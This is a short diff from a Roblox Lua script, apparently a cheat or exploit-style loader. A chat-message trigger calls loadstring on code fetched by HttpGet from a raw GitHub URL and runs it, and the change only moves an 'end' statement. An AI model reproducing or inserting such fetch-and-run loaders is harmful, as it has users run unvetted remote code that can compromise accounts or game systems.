@@ -868,5 +868,5 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == i then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))()
 end
-end
 end)
+end
